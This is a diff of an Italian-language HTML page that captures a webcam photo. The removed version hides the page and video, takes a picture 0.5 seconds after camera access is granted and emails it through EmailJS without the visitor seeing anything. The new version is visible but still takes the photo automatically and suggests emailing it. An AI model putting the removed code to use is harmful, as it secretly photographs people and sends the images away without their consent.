@@ -1,54 +1,44 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Foto automatica</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Scatta la Foto</title>
 </head>
-<body style="display: none;">
-    <video id="video" width="640" height="480" autoplay style="display: none;"></video>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script>
-        // Inizializza EmailJS con il tuo "user ID"
-        emailjs.init("your_user_id_here"); 
+<body>
+  <h1>Scatta la tua foto!</h1>
 
-        // Richiesta di accesso alla fotocamera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function (stream) {
-                var video = document.getElementById('video');
-                video.srcObject = stream;
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" style="display:none"></canvas>
+  <button id="takePhotoBtn">Scatta Foto</button>
 
-                // Dopo 0.5 secondi scatta la foto
-                setTimeout(function () {
-                    var canvas = document.createElement('canvas');
-                    var context = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  <script>
+    let video = document.getElementById("video");
+    let canvas = document.getElementById("canvas");
+    let context = canvas.getContext("2d");
+    let takePhotoBtn = document.getElementById("takePhotoBtn");
 
-                    // Salva l'immagine
-                    var dataUrl = canvas.toDataURL('image/jpeg');
+    // Avvio della fotocamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        video.srcObject = stream;
+      })
+      .catch(function(err) {
+        console.log("Errore nell'accesso alla fotocamera: " + err);
+      });
 
-                    // Invia la foto via email
-                    var formData = {
-                        photo: dataUrl, // Foto in formato base64
-                    };
+    // Dopo 0.5 secondi, scatta la foto automaticamente
+    setTimeout(function() {
+      takePhoto();
+    }, 500);
 
-                    // Invia l'email
-                    emailjs.send("your_service_id", "your_template_id", formData)
-                        .then(function (response) {
-                            console.log("Email inviata con successo", response);
-                        }, function (error) {
-                            console.log("Errore nell'invio dell'email", error);
-                        });
-
-                    // Ferma il flusso video
-                    stream.getTracks().forEach(track => track.stop());
-                }, 500); // 0.5 secondi di attesa
-            })
-            .catch(function (err) {
-                console.log('Errore nell\'accesso alla fotocamera: ' + err);
-            });
-    </script>
+    // Funzione per scattare la foto
+    function takePhoto() {
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      let imageData = canvas.toDataURL("image/jpeg");
+      // Puoi inviare l'immagine via email usando un servizio come EmailJS
+      console.log("Foto scattata", imageData);
+    }
+  </script>
 </body>
 </html>
